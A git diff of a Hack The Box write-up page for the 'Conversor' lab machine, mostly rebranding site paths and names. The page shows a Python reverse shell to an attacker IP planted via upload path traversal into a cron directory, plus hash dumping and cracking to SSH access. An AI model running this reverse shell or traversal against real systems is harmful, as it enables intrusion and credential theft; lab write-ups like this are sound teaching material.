@@ -4,7 +4,7 @@
   dir="ltr"
   class="scroll-smooth"
   data-default-appearance="dark"
-  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  data-auto-appearance="true"><head><script src="/bubka/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=bubka/livereload" data-no-instant defer></script>
   <meta charset="utf-8">
   
     <meta http-equiv="content-language" content="en-us">
@@ -15,8 +15,8 @@
 
   
   
-    <title>HTB-Conversor &middot; Lextra hack stuff</title>
-    <meta name="title" content="HTB-Conversor &middot; Lextra hack stuff">
+    <title>HTB-Conversor &middot; bubka hack stuff</title>
+    <meta name="title" content="HTB-Conversor &middot; bubka hack stuff">
   
 
   
@@ -26,7 +26,7 @@
   
   
   
-  <link rel="canonical" href="http://localhost:1313/writeups/htb-conversor/">
+  <link rel="canonical" href="http://localhost:1313/bubka/writeups/htb-conversor/">
   
 
   
@@ -34,8 +34,8 @@
   
 
   
-  <meta property="og:url" content="http://localhost:1313/writeups/htb-conversor/">
-  <meta property="og:site_name" content="Lextra hack stuff">
+  <meta property="og:url" content="http://localhost:1313/bubka/writeups/htb-conversor/">
+  <meta property="og:site_name" content="bubka hack stuff">
   <meta property="og:title" content="HTB-Conversor">
   <meta property="og:description" content="Difficulty: Easy OS: Linux Date: 2026-01-18 TL;DR # Flask web application vulnerable to path traversal during file uploads. Exploited by uploading Python reverse shell to cron-executed directory → gained www-data shell → extracted MD5 hashes from SQLite database → cracked password for user fismathack → leveraged CVE-2024-48990 in needrestart 3.7 for privilege escalation to root.
 Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)">
@@ -102,14 +102,14 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
   <link
     type="text/css"
     rel="stylesheet"
-    href="/css/main.bundle.min.6b395820ab321b4c24aa8173a69bca3235f876d3f10d16751c61a6f9340cb1051d8b88ad605be3ccc58d4f7cb218140d9dc97409e0c68afef4a5fc1a982ad3fd.css"
-    integrity="sha512-azlYIKsyG0wkqoFzppvKMjX4dtPxDRZ1HGGm&#43;TQMsQUdi4itYFvjzMWNT3yyGBQNncl0CeDGiv70pfwamCrT/Q==">
+    href="/bubka/css/main.bundle.min.4f40feea4c6f59a876576bf0c99d3ffd70a8847b71c25199e21b2f316a6ea95b5fce21b78684be222289fa9c04834d56e10420f50f8f476b9919b94ccc151f28.css"
+    integrity="sha512-T0D&#43;6kxvWah2V2vwyZ0//XCohHtxwlGZ4hsvMWpuqVtfziG3hoS&#43;IiKJ&#43;pwEg01W4QQg9Q&#43;PR2uZGblMzBUfKA==">
 
   
   
   <script
     type="text/javascript"
-    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    src="/bubka/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
     integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
   
   
@@ -118,7 +118,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
   
   
     
-    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+    <script src="/bubka/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
   
 
   
@@ -140,7 +140,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
       defer
       type="text/javascript"
       id="script-bundle"
-      src="/js/main.bundle.min.67624a357c928d29b9fe19ba01a1e32c05ad1329ca2a712bf10446df0c6872903d0c14b21f76896b57a5a0710940805416cee38851d9067db6555881188e35a5.js"
+      src="/bubka/js/main.bundle.min.67624a357c928d29b9fe19ba01a1e32c05ad1329ca2a712bf10446df0c6872903d0c14b21f76896b57a5a0710940805416cee38851d9067db6555881188e35a5.js"
       integrity="sha512-Z2JKNXySjSm5/hm6AaHjLAWtEynKKnEr8QRG3wxocpA9DBSyH3aJa1eloHEJQIBUFs7jiFHZBn22VViBGI41pQ=="
       data-copy="Copy"
       data-copied="Copied"></script>
@@ -149,7 +149,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
   
   
 
-<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+<script src="/bubka/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
 
 
 
@@ -195,10 +195,10 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
 
   
   
-    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
-    <link rel="manifest" href="/site.webmanifest">
+    <link rel="apple-touch-icon" sizes="180x180" href="/bubka/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/bubka/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/bubka/favicon-16x16.png">
+    <link rel="manifest" href="/bubka/site.webmanifest">
   
 
   
@@ -211,7 +211,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
     "headline": "HTB-Conversor",
     
     "inLanguage": "en-us",
-    "url" : "http://localhost:1313/writeups/htb-conversor/",
+    "url" : "http://localhost:1313/bubka/writeups/htb-conversor/",
     "author" : {
       "@type": "Person",
       "name": ""
@@ -282,8 +282,8 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
     <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
   
   
-    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
-      Lextra hack stuff
+    <a href="/bubka/" class="text-base font-medium truncate min-w-0 shrink">
+      bubka hack stuff
     </a>
   
   <div class="flex items-center ms-auto">
@@ -294,7 +294,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
       
   
     <a
-      href="/writeups/"
+      href="/bubka/writeups/"
       
       class="flex items-center bf-icon-color-hover"
       aria-label="writeups"
@@ -312,11 +312,11 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
       
   
     <a
-      href="/"
+      href="/bubka/"
       
       class="flex items-center bf-icon-color-hover"
       aria-label="about"
-      title="Lextra hack stuff">
+      title="bubka hack stuff">
       
       
         <span class="text-base font-medium break-normal">
@@ -422,7 +422,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
     
     <div class="px-2">
       <a
-        href="/writeups/"
+        href="/bubka/writeups/"
         aria-label="writeups"
         
         class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
@@ -439,12 +439,12 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
     
     <div class="px-2">
       <a
-        href="/"
+        href="/bubka/"
         aria-label="about"
         
         class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
         
-        <span title="Lextra hack stuff" class="text-2xl font-bold tracking-tight">
+        <span title="bubka hack stuff" class="text-2xl font-bold tracking-tight">
           about
         </span>
         
@@ -567,7 +567,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
         
           
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/web/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/web/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -577,7 +577,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
 
               </a>
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/nmap/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/nmap/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -587,7 +587,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
 
               </a>
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/cve-2024-48990/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/cve-2024-48990/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -597,7 +597,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
 
               </a>
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/file-upload/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/file-upload/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -607,7 +607,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
 
               </a>
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/path-traversal/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/path-traversal/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -617,7 +617,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
 
               </a>
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/needrestart/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/needrestart/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -627,7 +627,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
 
               </a>
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/sqlite/">
+              <a class="relative mt-[0.5rem] me-2" href="/bubka/tags/sqlite/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
@@ -892,7 +892,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
     
 </h3>
 <p><code>nmap</code> identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bubka@bubka$ nmap 10.129.4.129 -p- -A --min-rate <span style="color:#a5d6ff">5000</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bubka@bubka$ nmap 10.129.4.129 -p- -A --min-rate <span style="color:#a5d6ff">5000</span>
 </span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2026-01-19 06:23 -0500
 </span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.129.4.129
 </span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.051s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
@@ -920,7 +920,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
 </span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 24.69 seconds</span></span></code></pre></div></div>
 <p>I added the host domain to my <code>/etc/hosts file</code>.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubka$ tail -1 /etc/hosts  
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubka$ tail -1 /etc/hosts  
 </span></span><span style="display:flex;"><span>10.129.4.129      conversor.htb</span></span></code></pre></div></div>
 
 <h3 class="relative group">Website Enumeration
@@ -941,10 +941,10 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
     alt="sex"
     width="812"
     height="308"
-    src="/writeups/htb-conversor/image_hu_5ad29015694976bc.png"
-    srcset="/writeups/htb-conversor/image_hu_5ad29015694976bc.png 800w, /writeups/htb-conversor/image.png 1280w"
+    src="/bubka/writeups/htb-conversor/image_hu_5ad29015694976bc.png"
+    srcset="/bubka/writeups/htb-conversor/image_hu_5ad29015694976bc.png 800w, /bubka/writeups/htb-conversor/image.png 1280w"
     sizes="(min-width: 768px) 50vw, 65vw"
-    data-zoom-src="/writeups/htb-conversor/image.png"></figure>
+    data-zoom-src="/bubka/writeups/htb-conversor/image.png"></figure>
 </p>
 <p>Clicking &ldquo;Register&rdquo; redirects to a registration page where I created an account
 <figure><img
@@ -955,10 +955,10 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
     alt="sex"
     width="815"
     height="307"
-    src="/writeups/htb-conversor/image1_hu_7c172d6288262a87.png"
-    srcset="/writeups/htb-conversor/image1_hu_7c172d6288262a87.png 800w, /writeups/htb-conversor/image1.png 1280w"
+    src="/bubka/writeups/htb-conversor/image1_hu_7c172d6288262a87.png"
+    srcset="/bubka/writeups/htb-conversor/image1_hu_7c172d6288262a87.png 800w, /bubka/writeups/htb-conversor/image1.png 1280w"
     sizes="(min-width: 768px) 50vw, 65vw"
-    data-zoom-src="/writeups/htb-conversor/image1.png"></figure>
+    data-zoom-src="/bubka/writeups/htb-conversor/image1.png"></figure>
 </p>
 <p>The application converts XML and XSLT files into HTML
 <figure><img
@@ -969,10 +969,10 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
     alt="sex"
     width="1186"
     height="747"
-    src="/writeups/htb-conversor/image2_hu_7f73c619795263c5.png"
-    srcset="/writeups/htb-conversor/image2_hu_7f73c619795263c5.png 800w, /writeups/htb-conversor/image2.png 1280w"
+    src="/bubka/writeups/htb-conversor/image2_hu_7f73c619795263c5.png"
+    srcset="/bubka/writeups/htb-conversor/image2_hu_7f73c619795263c5.png 800w, /bubka/writeups/htb-conversor/image2.png 1280w"
     sizes="(min-width: 768px) 50vw, 65vw"
-    data-zoom-src="/writeups/htb-conversor/image2.png"></figure>
+    data-zoom-src="/bubka/writeups/htb-conversor/image2.png"></figure>
 </p>
 <p>I downloaded the source code from the &ldquo;About&rdquo; page.
 <figure><img
@@ -983,12 +983,12 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
     alt="sex"
     width="1182"
     height="745"
-    src="/writeups/htb-conversor/image3_hu_598859ee89ed0201.png"
-    srcset="/writeups/htb-conversor/image3_hu_598859ee89ed0201.png 800w, /writeups/htb-conversor/image3.png 1280w"
+    src="/bubka/writeups/htb-conversor/image3_hu_598859ee89ed0201.png"
+    srcset="/bubka/writeups/htb-conversor/image3_hu_598859ee89ed0201.png 800w, /bubka/writeups/htb-conversor/image3.png 1280w"
     sizes="(min-width: 768px) 50vw, 65vw"
-    data-zoom-src="/writeups/htb-conversor/image3.png"></figure>
+    data-zoom-src="/bubka/writeups/htb-conversor/image3.png"></figure>
 </p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.
 </span></span><span style="display:flex;"><span>├── app.py
 </span></span><span style="display:flex;"><span>├── app.wsgi
 </span></span><span style="display:flex;"><span>├── install.md
@@ -1025,7 +1025,7 @@ The application is built with Python Flask.
 In app.py i found that XSLT file dont use parser configuration like XLM do.
 no filename sanitization was found in the upload handler, enabling path traversal attacks.</p>
 <p><u>app.py:</u></p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">...</span>[snip]<span style="color:#ff7b72;font-weight:bold">...</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">...</span>[snip]<span style="color:#ff7b72;font-weight:bold">...</span>
 </span></span><span style="display:flex;"><span>parser <span style="color:#ff7b72;font-weight:bold">=</span> etree<span style="color:#ff7b72;font-weight:bold">.</span>XMLParser(resolve_entities<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">False</span>, no_network<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">True</span>, dtd_validation<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">False</span>, load_dtd<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">False</span>)
 </span></span><span style="display:flex;"><span>xml_tree <span style="color:#ff7b72;font-weight:bold">=</span> etree<span style="color:#ff7b72;font-weight:bold">.</span>parse(xml_path, parser)   
 </span></span><span style="display:flex;"><span>xslt_tree <span style="color:#ff7b72;font-weight:bold">=</span> etree<span style="color:#ff7b72;font-weight:bold">.</span>parse(xslt_path)       <span style="color:#8b949e;font-style:italic"># no parse configuration</span>
@@ -1037,7 +1037,7 @@ no filename sanitization was found in the upload handler, enabling path traversa
 <li>load_dtd=False (prevents loading external DTD)</li>
 </ul>
 <p><code>install.md</code> reveals a cron job that executes all Python scripts in /var/www/conversor.htb/scripts/ every minute.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">...</span>[snip]<span style="color:#ff7b72;font-weight:bold">...</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">...</span>[snip]<span style="color:#ff7b72;font-weight:bold">...</span>
 </span></span><span style="display:flex;"><span>You can also run it <span style="color:#ff7b72">with</span> Apache using the app<span style="color:#ff7b72;font-weight:bold">.</span>wsgi file<span style="color:#ff7b72;font-weight:bold">.</span>
 </span></span><span style="display:flex;"><span>If you want to run Python scripts (<span style="color:#ff7b72">for</span> example, our server deletes all files older than <span style="color:#a5d6ff">60</span> minutes to avoid system overload), you can add the following line to your <span style="color:#ff7b72;font-weight:bold">/</span>etc<span style="color:#ff7b72;font-weight:bold">/</span>crontab<span style="color:#ff7b72;font-weight:bold">.</span>
 </span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;
@@ -1056,7 +1056,7 @@ no filename sanitization was found in the upload handler, enabling path traversa
 </h2>
 <p>Attack-Vector: Arbitrary File Upload via Path Traversal to Cron RCE.</p>
 <p>The application does not sanitize filenames properly. I can upload a Python reverse shell and use path traversal (../scripts/) to save it into the directory executed by the cronjob</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubka$ cat exploit.py
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubka$ cat exploit.py
 </span></span><span style="display:flex;"><span>import socket,subprocess,os
 </span></span><span style="display:flex;"><span><span style="color:#79c0ff">s</span><span style="color:#ff7b72;font-weight:bold">=</span>socket.socket<span style="color:#ff7b72;font-weight:bold">(</span>socket.AF_INET,socket.SOCK_STREAM<span style="color:#ff7b72;font-weight:bold">)</span>
 </span></span><span style="display:flex;"><span>s.connect<span style="color:#ff7b72;font-weight:bold">((</span><span style="color:#a5d6ff">&#34;10.10.14.80&#34;</span>,5323<span style="color:#ff7b72;font-weight:bold">))</span> 
@@ -1079,17 +1079,17 @@ no filename sanitization was found in the upload handler, enabling path traversa
     </span>
     
 </h2>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubla$ nc -lvnp <span style="color:#a5d6ff">5323</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubla$ nc -lvnp <span style="color:#a5d6ff">5323</span>
 </span></span><span style="display:flex;"><span>listening on <span style="color:#ff7b72;font-weight:bold">[</span>any<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">5323</span> ...
 </span></span><span style="display:flex;"><span>connect to <span style="color:#ff7b72;font-weight:bold">[</span>10.10.14.80<span style="color:#ff7b72;font-weight:bold">]</span> from <span style="color:#ff7b72;font-weight:bold">(</span>UNKNOWN<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#ff7b72;font-weight:bold">[</span>10.129.4.226<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">51018</span>
 </span></span><span style="display:flex;"><span>www-data@conversor:~$ </span></span></code></pre></div></div>
 <p>i know that exist database. Analyzing <code>users.db</code> revealed hashes for users &lsquo;fismathack&rsquo;</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@conversor:~$ sqlite3 /var/www/conversor.htb/instance/users.db <span style="color:#a5d6ff">&#34;SELECT * FROM users;&#34;</span>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>www-data@conversor:~$ sqlite3 /var/www/conversor.htb/instance/users.db <span style="color:#a5d6ff">&#34;SELECT * FROM users;&#34;</span>
 </span></span><span style="display:flex;"><span>&lt;versor.htb/instance/users.db <span style="color:#a5d6ff">&#34;SELECT * FROM users;&#34;</span>
 </span></span><span style="display:flex;"><span>1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
 </span></span><span style="display:flex;"><span>5|bubka|d6f23513481dcdbb81a197a16ea36c5f</span></span></code></pre></div></div>
 <p>cracking fismathack MD5 hash</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubka$ echo <span style="color:#a5d6ff">&#34;5b5c3ac3a1c897c94caad48e6c71fdec&#34;</span> &gt; hash.txt
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubka$ echo <span style="color:#a5d6ff">&#34;5b5c3ac3a1c897c94caad48e6c71fdec&#34;</span> &gt; hash.txt
 </span></span><span style="display:flex;"><span>bubka@bubka$ hashcat -m <span style="color:#a5d6ff">0</span> -a <span style="color:#a5d6ff">0</span> hash.txt /usr/share/wordlists/rockyou.txt --show
 </span></span><span style="display:flex;"><span>5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm</span></span></code></pre></div></div>
 
@@ -1103,12 +1103,12 @@ no filename sanitization was found in the upload handler, enabling path traversa
     
 </h2>
 <p>using <code>ssh</code> with <code>Keepmesafeandwarm</code> password</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubka$ ssh fismathack@conversor.htb
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubka$ ssh fismathack@conversor.htb
 </span></span><span style="display:flex;"><span>...<span style="color:#ff7b72;font-weight:bold">[</span>snip<span style="color:#ff7b72;font-weight:bold">]</span>...
 </span></span><span style="display:flex;"><span>fismathack@conversor:~$ whoami
 </span></span><span style="display:flex;"><span>fismathack</span></span></code></pre></div></div>
 <p>getting user flag</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fismathack@conversor:~$ cat ~/user.txt
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fismathack@conversor:~$ cat ~/user.txt
 </span></span><span style="display:flex;"><span>55362fe3efcdfdcc6d8f0b6c474d4b6d</span></span></code></pre></div></div>
 
 <h2 class="relative group">Shell as root
@@ -1120,7 +1120,7 @@ no filename sanitization was found in the upload handler, enabling path traversa
     </span>
     
 </h2>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fismathack@conversor:~$ sudo -l
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>fismathack@conversor:~$ sudo -l
 </span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#ff7b72">for</span> fismathack on conversor:
